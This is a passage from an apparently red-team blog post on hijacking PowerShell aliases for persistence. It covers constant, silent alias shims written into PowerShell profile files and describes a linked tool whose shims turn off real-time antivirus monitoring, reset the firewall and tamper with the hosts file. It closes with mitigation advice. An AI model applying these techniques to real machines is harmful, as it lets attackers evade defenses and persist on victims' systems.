parentName: \"p\"\n  }, \"Option AllScope\"), \": Alias is copied to any new scopes that are created\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Scope Global\"), \": Scope in which alias is valid. Global means scope is in effect when PowerShell starts.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"ErrorAction\"), \": If an error should occur for whatever reason it will not error display an error message user as that may alert the user, rather just silently continue.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Force\"), \": This is required as the majority of built-in PowerShell aliases are ReadOnly which means they cannot be changed or deleted unless the Force parameter is used. To see which aliases are ReadOnly do: \"))), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Get-Alias | Where-Object {$_.Options -Match \\\"ReadOnly\\\"}\\n\")), mdx(\"h3\", {\n    \"id\": \"basic-removal-of-the-shim\"\n  }, \"Basic Removal of the Shim\"), mdx(\"p\", null, \"Now that we have remapped an alias, you\\u2019re probably\\nwondering how do I remove it?\"), mdx(\"p\", null, \"The answer is simple as we can just do:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Remove-Alias -Name ls -Force\\nOr\\nRemove-Item alias:ls -Force\\n\")), mdx(\"p\", null, \"That works just fine as ls is no longer aliased our shim no longer works.\"), mdx(\"br\", null), mdx(\"p\", null, \"However, we can fix that :)\"), mdx(\"br\", null), mdx(\"p\", null, \"Now when you do Set-Alias instead of  \", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"-Option AllScope\"), \" do\\n\", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"-Option AllScope, Constant\")), mdx(\"p\", null, \"Let\\u2019s try deleting it now, we will even run PowerShell as an administrator\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1255px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"52.430278884462155%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAABJ0AAASdAHeZh94AAABwElEQVQoz53Qy2sTQRwH8LEFEUqt0DwPBa2xqZtXKTSR3jwoVvFQSl7dKNjEm2Bt6d3/0YOnmuaxyXZ3Z5/ZzTx3nPUg4kn88mGY7wy/OQz4PprNdHMyhzdTfapD20fekrphwgmZs8B+xNyQuAviL/lvgYQ4uB6Ov11rs1sXWtataVuWDR3DNHXTgjp0TNNwHNuwZKAXLLwg8PyE6weW7QHH80xrCfUotBA0sG1Qz/BdI6CICMY4o5zQmFJGSCw3hHJKOSNC8CgMQBSFjAmMYoI5xpygGOMYyYpiSmJMOMExIfKKyUqJkI/IcSGEHyTDkfg7sfiH+L4PEFqK/wpCCAxHk/F0PtF0uY41SZ9oss5/jDVp+MvNH4ajqSZ/0/ZM6ILD46vyq/Pam8vSy/Pq0Zfa6wtZC88/5Rr93LNBvjHINvqbB/3UQT9dT2Tq8vxjpj548e4rUA7Pinu9wl4vX+qmle6D3c5Gsb2200o2u21pvdi+W2jdK7RWHzdXtpvg4cmdRydg67h69Blk6x9SFXVr//26cnpf6aYr6mbpNF1WMxU1VU5kq2q+2svVehtKd+1pZ+VJe3WnA7ab+28vfwJAlrjM0vN6CAAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/00e58dcd33a1beaa463d48a8837577ee/aecae/removeme.webp 1255w\"],\n    \"sizes\": \"(max-width: 1255px) 100vw, 1255px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/00e58dcd33a1beaa463d48a8837577ee/d90ba/removeme.png 1255w\"],\n    \"sizes\": \"(max-width: 1255px) 100vw, 1255px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/00e58dcd33a1beaa463d48a8837577ee/d90ba/removeme.png\",\n    \"alt\": \"RemoveMe\",\n    \"title\": \"RemoveMe\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"PowerShell now throws an error as the alias is a constant!\"), mdx(\"h3\", {\n    \"id\": \"taking-it-one-step-further\"\n  }, \"Taking it one Step Further\"), mdx(\"p\", null, \"Now that we have learned how to realias aliases to our shimmed version\\nwouldn\\u2019t it be nice to just cut out the middle man. Instead of relaliasing aliases\\nlet\\u2019s just redefine what the alias is defined as!\"), mdx(\"p\", null, \"Back to our favorite example with ls\\nwe saw that it was aliased to Get-ChildItem so lets try redefining\\nwhat Get-ChildItem is:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1077px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"70.93779015784587%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAABJ0AAASdAHeZh94AAABvElEQVQoz52RyU/CQBTGB3ENrgjiEhQCosiOqGhwuRmjhINiRSkiyGY8aCLhb/XgTYUKbay0FCy0vsrFQOjB5pf2vZl+830zg0pl6vml9PpG1T+rLPlJV5gq9cWRJY4ieParWa/yHMBAIXwzHSC+ydfrTZbhYZZjWjQt0LTIVJu1WqPBCY2ayLECw4o1ThBEsQMktFrifx9UJCrFD5KoUJD/nSCLBEmUpRp4LZYlSpU2b10gbyhvPXxwB/OO4yfb0eN6qOAJ5r2hguskbzy4n9/OzGze9gIZ9nILO5m57bTaewPMbqXU6zfTvoTGl1QuY8h4hgynPdEHMrqt1Kw/NemJD6xeIFO4bxnrM5+334p20QM04Y6pHDgw5sSnPPExB64whX81klIetLCTlv4zhQdXIxpfYsJ9DeawlmYj2b8iBZETq71x9Kscd8VGbFGVHYdRpQUbdUKW2JD1Epl6i+f8t/AZd10b9u/gkHSbUjtojegD2cVATmWPypgjrS8B06MuXL+bg9jajSSMDtuudP4U3MLI2pWcGGIrzJjScgEJAcjfPi2oVY4otHKxl3azYAKGsFsw+evT0XbzAzYNVl0qw/B6AAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e549a724c271a943c658d842798ef103/e87cb/advanced.webp 1077w\"],\n    \"sizes\": \"(max-width: 1077px) 100vw, 1077px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e549a724c271a943c658d842798ef103/6977f/advanced.png 1077w\"],\n    \"sizes\": \"(max-width: 1077px) 100vw, 1077px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e549a724c271a943c658d842798ef103/6977f/advanced.png\",\n    \"alt\": \"Advanced\",\n    \"title\": \"Advanced\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Get-ChildItem has been redefined to spawn a powershell session that simply calls Get-ChildItem. PowerShell is called with the flag -nop short for NoProfile as to not load profiles.\"), mdx(\"h3\", {\n    \"id\": \"powershell-profiles-to-the-rescue\"\n  }, \"PowerShell Profiles to the Rescue\"), mdx(\"p\", null, \"There is one big problem with aliasing, our shimmed aliases\\nonly exist within the current PowerShell session.\\nThat means when a user opens up a new PowerShell session all our hard work\\nis lost. Luckily, PowerShell profiles exist, a profile is a PowerShell script that runs whenever the user opens up PowerShell. Profiles are documented in the MITRE attack\\nframework as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://attack.mitre.org/techniques/T1504/%22\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"T1504\"), \"\\n. What this means for us is that we need to create that special profile called profile.ps1 that will load our malicious shims whenever a user opens up PowerShell.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"The Four Different Locations of Powershell Profiles\"), \":\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"574px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"60.97560975609756%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAABJ0AAASdAHeZh94AAABDklEQVQoz6VR2XLDMAjU/39kj9ROM9OJJSSh23ZWoumkbdqX7NgYgdjFoIzRz08vh9dDznnf923bYHNOb9Mk/j9QMUa9LEQUYqi1SgEcrXXsSCkmif+Gyrk4SxyYyOKqULbWQKeNFkhTd5RLKd77GAMeaymnXl9bJQvAOPZMBlQkZ+vsVyOq5MKM4hQGkBBlOYKXmVOM/RMCd8u3bWdjBqN3GF4S5VoNGW0WRKR/Mh1wluV8Pn+A/bNt55xnLzpQQmJdV+4ybij1OFRH0reebte2UWxHMQewoIV1bQjOx3masK8ZOA7//XTChf1mf+ruGMFaOipe/BdMyUnG8W3acrWvd7s6f+NHVu0P4KHiC9Z1vXZjtE7XAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b9b4cdd50d526ae8b131bc942f61d429/723c8/profile_locations_pshome.webp 574w\"],\n    \"sizes\": \"(max-width: 574px) 100vw, 574px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b9b4cdd50d526ae8b131bc942f61d429/bf737/profile_locations_pshome.png 574w\"],\n    \"sizes\": \"(max-width: 574px) 100vw, 574px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/b9b4cdd50d526ae8b131bc942f61d429/bf737/profile_locations_pshome.png\",\n    \"alt\": \"Profile_Locations\",\n    \"title\": \"Profile_Locations\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$PSHOME = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\")), mdx(\"br\", null), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$HOME = C:\\\\Users\", \"[\", \"User]\")), mdx(\"h4\", {\n    \"id\": \"you-can-also-do\"\n  }, \"You can also do\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"587px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"46.33730834752981%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAABCklEQVQoz31S7Y6EIAz0/V/yzn+uIAoFv7XXabbmzHrXZAIpZTpDqcaxcF3X/P1V8ziO/DvO89TVe8etc1fuP1TbtvEwDNz3gxLO88zTNDHyRphz5s77K3ccx4VHQlwwpESCxMuyXEpLKexE4bqu/BQfhCAAQEhEHGNSpaYQubZtxUUv9r3sX9x1Hb+aRu8gTG2177taBWAVakCGvBEiH2PUM8DcYG91N4WkNomzFKQUlcC6qmW5DGVwEeW9g6gLIXCi9GwZlqwzZfoklLMQOo7SbBDbeBIMkqTB41CI0tsGKbm9341QVJlCI0T+j2/TazG+TsnlZkOHImeNDAA28X288zJ1fzW0OsQP11u9bi/oc70AAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f9304adc0e9e1ccc157471317e947f9c/d84e9/profile_locations_profile.webp 587w\"],\n    \"sizes\": \"(max-width: 587px) 100vw, 587px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f9304adc0e9e1ccc157471317e947f9c/3a024/profile_locations_profile.png 587w\"],\n    \"sizes\": \"(max-width: 587px) 100vw, 587px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/f9304adc0e9e1ccc157471317e947f9c/3a024/profile_locations_profile.png\",\n    \"alt\": \"Profile_Locations\",\n    \"title\": \"Profile_Locations\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"The two we are focusing on are:\"), mdx(\"h3\", {\n    \"id\": \"profilecurrentuserallhosts-and-profilealluserallhosts\"\n  }, \"$PROFILE.CurrentUserAllHosts\", mdx(\"strong\", {\n    parentName: \"h3\"\n  }, \" and \"), \"$PROFILE.AllUserAllHosts\"), mdx(\"br\", null), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$PROFILE.CurrentUserAllHosts = C:\\\\Users\", \"\\\\\", \"[User]\", \"\\\\Documents\\\\WindowsPowerShell\\\\profile.ps1\")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$PROFILE.AllUserAllHosts = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\profile.ps1\")), mdx(\"p\", null, \"To write to the latter of the two we need to have administrative permissions\\non the box. An interesting tidbit to note is that when PowerShell first runs it will check if the profile for all users has been created and if that doesn\\u2019t exist it will use the profile for the current user if it exists.\"), mdx(\"p\", null, \"Keep in mind PowerShell Profiles do not exist by default, you will have to create those files.\"), mdx(\"h3\", {\n    \"id\": \"putting-all-the-pieces-together\"\n  }, \"Putting All the Pieces Together\"), mdx(\"p\", null, \"With so many aliases in PowerShell and having to create the PowerShell Profiles, it could seem daunting to do this manually. Luckily you don\\u2019t have to as I created a simple PowerShell script called Remapper which does all of the hard work for you! The only thing you may wish to modify are the functions in the first lines of the script. These funcions are what will be called when an alias is run.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"What the script does:\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Get paths of profiles and create them if they don\\u2019t exist\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Create a dictionary mapping aliases to shimmed definitions for the majority of aliases.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Puts the code to rewrite every alias into both PowerShell profiles.\"))), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Our shimmed function does four things\"), \":\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Do what the alias is originally meant for\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Start a job to restore firewall to default settings\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Start a job to turn off real-time monitoring\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Check if google\", \".\", \"com is in the hosts file, if not will add it because during competitions we don\\u2019t blue teamers using Google ;).\"))), mdx(\"p\", null, \"Let\\u2019s run the script as an administrator and see what happens!\"), mdx(\"p\", null, mdx(\"img\", _extends({\n    parentName: \"p\"\n  }, {\n    \"src\": \"/076d38417289bf32775eb32887a02362/demo.gif\",\n    \"alt\": \"Demo\"\n  }))), mdx(\"p\", null, \"As can be seen, both profiles have been modified and if we do Get-Alias everything has been shimmed. Now when we type an alias it will run our shimmed version of it :)\"), mdx(\"p\", null, \"The script can be found here:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/Remapper\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Remapper\")), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Monitoring of PowerShell Profile locations to look for either creation of the file or someone writing to it.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Checking what aliases are defined as\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Avoiding the use of aliases; although, if you dig into PowerShell\\u2019s\\nsource code you will see some commands use aliases!\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Avoiding Powershell Profiles all together using the flag -No Profile when using PowerShell.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Powershell Logging \"))), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Looking into shimming aliases for Command Prompt sessions\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Looking into CLR hooking instead of PowerShell profiles.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Researching the shimming of built-in PowerShell functions.\"))), mdx(\"h3\", {\n    \"id\": \"closing-thoughts\"\n  }, \"Closing Thoughts\"), mdx(\"p\", null, \"The concept of realiasing things in PowerShell is very fascinating, I have not seen too much research on it and would be curious to see just how far you can take it.\\nOverall, I hope this blog post gets people interested in the topic and can serve to be another neat trick for red teamers. While also giving blue teamers something else to watch out for.\"), mdx(\"h2\", {\n    \"id\": \"references\"\n  }, \"References\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://attack.mitre.org/techniques/T1504/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://attack.mitre.org/techniques/T1504/\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-alias?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-alias?view=powershell-6\")))));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAwACBP/EABYBAQEBAAAAAAAAAAAAAAAAAAEDBP/aAAwDAQACEAMQAAABbfO2eoxw/wD/xAAZEAADAQEBAAAAAAAAAAAAAAAAAQIRAyH/2gAIAQEAAQUC54ipHJFeO8HTZ//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABcQAQADAAAAAAAAAAAAAAAAABAAETH/2gAIAQEABj8CluH/xAAXEAADAQAAAAAAAAAAAAAAAAAAAREh/9oACAEBAAE/IZBDYS3mEIhFgaU//9oADAMBAAIAAwAAABC0L//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/EBAn/8QAGhABAQEBAQEBAAAAAAAAAAAAAREAMSFBcf/aAAgBAQABPxA8jZVW6Jp70c5V+MNlJA1hLw+7iG//2Q==","aspectRatio":1.4658385093167703,"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/58fe7/Treasure.jpg","srcSet":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e0f30/Treasure.jpg 236w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/86afd/Treasure.jpg 472w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/58fe7/Treasure.jpg 944w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/02748/Treasure.jpg 1416w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/5c241/Treasure.jpg 1888w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1fd0c/Treasure.jpg 3508w","srcWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/99fbb/Treasure.webp","srcSetWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/77392/Treasure.webp 236w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1f177/Treasure.webp 472w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/99fbb/Treasure.webp 944w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/4a492/Treasure.webp 1416w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/b0b8f/Treasure.webp 1888w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e7d05/Treasure.webp 3508w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAwACBP/EABYBAQEBAAAAAAAAAAAAAAAAAAEDBP/aAAwDAQACEAMQAAABbfO2eoxw/wD/xAAZEAADAQEBAAAAAAAAAAAAAAAAAQIRAyH/2gAIAQEAAQUC54ipHJFeO8HTZ//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABcQAQADAAAAAAAAAAAAAAAAABAAETH/2gAIAQEABj8CluH/xAAXEAADAQAAAAAAAAAAAAAAAAAAAREh/9oACAEBAAE/IZBDYS3mEIhFgaU//9oADAMBAAIAAwAAABC0L//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/EBAn/8QAGhABAQEBAQEBAAAAAAAAAAAAAREAMSFBcf/aAAgBAQABPxA8jZVW6Jp70c5V+MNlJA1hLw+7iG//2Q==","aspectRatio":1.4684684684684686,"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1dc0b/Treasure.jpg","srcSet":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/3a5ce/Treasure.jpg 163w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/05730/Treasure.jpg 327w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1dc0b/Treasure.jpg 653w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/f72c7/Treasure.jpg 980w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/6e4a3/Treasure.jpg 